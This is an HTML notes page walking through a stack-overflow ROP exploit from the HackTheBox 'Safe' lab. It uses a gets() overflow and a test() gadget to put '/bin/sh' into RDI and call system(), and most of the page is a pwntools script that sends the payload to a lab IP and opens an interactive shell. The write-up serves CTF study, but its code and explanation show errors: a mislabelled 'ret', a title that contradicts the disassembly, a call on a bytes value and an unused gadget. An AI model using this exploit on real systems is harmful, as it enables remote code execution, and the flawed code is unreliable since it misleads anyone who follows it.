<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>x64 - push rbp; mov rsp, rdi</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1>#How-to - Write a string to memory - x64 - push rbp; mov rsp, rdi</h1></strong><br /><em>This example is from hackthebox Safe</em><br /><br /><strong><h2>## Problem</h2></strong><br />• NX enabled<br />• Targetting remote system, so can&#39;t ret2libc<br />• Leaking <code>libc</code> too complicated/not needed<br />• Program asks for user input with <code>gets()</code>, so can write a string to the stack<br />   ◇ but stack isn&#39;t usable because address of stack changes on every system<br />• Need a way to pop pointer <code>/bin/sh</code> string into RDI for <code>system()</code><br /><br /><strong><h2>## C Pseudo Code</h2></strong><br /><div class="codebox"><div class="codebox">int&nbsp;main()&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;user_input[112];<br />&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;system(&quot;/bin/uptime&quot;);<br />&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;What&nbsp;do&nbsp;you&nbsp;want&nbsp;me&nbsp;to&nbsp;echo&nbsp;back&quot;?);<br />&nbsp;&nbsp;&nbsp;&nbsp;gets(user_input);<br />&nbsp;&nbsp;&nbsp;&nbsp;puts(user_input);<br />&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;0;<br />}</div></div><br /><br /><strong><h2>## push rbp; mov rsp, rdi</h2></strong><br />There&#39;s a <code>test</code> function in the binary which will set up RDI<br /><div class="codebox"><div class="codebox">#0000000000401152&nbsp;&lt;test&gt;:<br />#&nbsp;&nbsp;401152:	55&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;	push&nbsp;&nbsp;&nbsp;rbp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;push&nbsp;rbp&nbsp;(/bin/sh)&nbsp;to&nbsp;top&nbsp;of&nbsp;stack<br />#&nbsp;&nbsp;401153:	48&nbsp;89&nbsp;e5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;	mov&nbsp;&nbsp;&nbsp;&nbsp;rbp,rsp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;move&nbsp;rsp&nbsp;(/bin/sh)&nbsp;into&nbsp;rbp<br />#&nbsp;&nbsp;401156:	48&nbsp;89&nbsp;e7&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;	mov&nbsp;&nbsp;&nbsp;&nbsp;rdi,rsp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;move&nbsp;rsp&nbsp;(/bin/sh)&nbsp;into&nbsp;rdi<br />#&nbsp;&nbsp;401159:	41&nbsp;ff&nbsp;e5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;	ret<br />#&nbsp;...</div></div><br /><br />• <code>push rbp</code> will push your <code>/bin/sh</code> string pointed to by <code>RBP</code> onto the top of the stack<br />   ◇ <code>RSP</code> now points to your <code>/bin/sh</code> string because it&#39;s at the top of the stack<br />• <code>mov rbp, rsp</code> moves the data in <code>RSP</code> (which points to /bin/sh) into <code>RBP</code><br />• <code>mov rdi, rsp</code> will move the data in <code>RSP</code> (/bin/sh) into <code>RDI</code> (the register we need set-up to call system())<br />   ◇ There is now a pointer to your <code>/bin/sh</code> string in <code>RDI</code><br /><br /><strong><h2>## Exploit Code</h2></strong><br /><div class="codebox"><div class="codebox">from&nbsp;pwn&nbsp;import&nbsp;*<br /><br />#&nbsp;***NOTE***:&nbsp;exploit&nbsp;wont&#39;&nbsp;work&nbsp;inside&nbsp;of&nbsp;gdb,&nbsp;no&nbsp;idea&nbsp;why<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;it&nbsp;also&nbsp;won&#39;t&nbsp;work&nbsp;without&nbsp;pwntools&nbsp;interactive(),&nbsp;no&nbsp;idea&nbsp;why<br /><br />#&nbsp;-------&nbsp;GADGETS&nbsp;-------<br />pop_r13_14_15_ret&nbsp;=&nbsp;p64(0x00401206)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;pop&nbsp;r13;&nbsp;pop&nbsp;r14;&nbsp;pop&nbsp;r15;&nbsp;ret;<br />system_addr&nbsp;=&nbsp;p64(0x00401040)<br />test_addr&nbsp;=&nbsp;p64(0x00401152)<br />#0000000000401152&nbsp;&lt;test&gt;:<br />#&nbsp;&nbsp;401152:	55&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;	push&nbsp;&nbsp;&nbsp;rbp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;push&nbsp;rbp&nbsp;(/bin/sh)&nbsp;to&nbsp;top&nbsp;of&nbsp;stack<br />#&nbsp;&nbsp;401153:	48&nbsp;89&nbsp;e5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;	mov&nbsp;&nbsp;&nbsp;&nbsp;rbp,rsp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;move&nbsp;rsp&nbsp;(/bin/sh)&nbsp;into&nbsp;rbp<br />#&nbsp;&nbsp;401156:	48&nbsp;89&nbsp;e7&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;	mov&nbsp;&nbsp;&nbsp;&nbsp;rdi,rsp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;move&nbsp;rsp&nbsp;(/bin/sh)&nbsp;into&nbsp;rdi<br />#&nbsp;&nbsp;401159:	41&nbsp;ff&nbsp;e5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;	ret<br />#&nbsp;...<br /><br />#&nbsp;-------&nbsp;EXPLOIT&nbsp;-------<br />payload&nbsp;&nbsp;=&nbsp;&quot;A&quot;*112&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;offset&nbsp;to&nbsp;RIP&nbsp;at&nbsp;120&nbsp;bytes<br />payload&nbsp;+=&nbsp;&quot;/bin/sh\x00&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;rbp&nbsp;points&nbsp;here<br />payload&nbsp;+=&nbsp;test_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;moves&nbsp;pointer&nbsp;to&nbsp;&quot;/bin/sh&quot;&nbsp;into&nbsp;rdi<br /><br />#&nbsp;ret&nbsp;1<br />payload&nbsp;+=&nbsp;system_addr()&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;return&nbsp;to&nbsp;system()<br /><br />r&nbsp;=&nbsp;remote(&#39;10.10.10.147&#39;,&nbsp;1337)<br />r.sendline(payload)<br />r.interactive()<br /><br />#print&nbsp;payload</div></div></div>
</body>
</html>
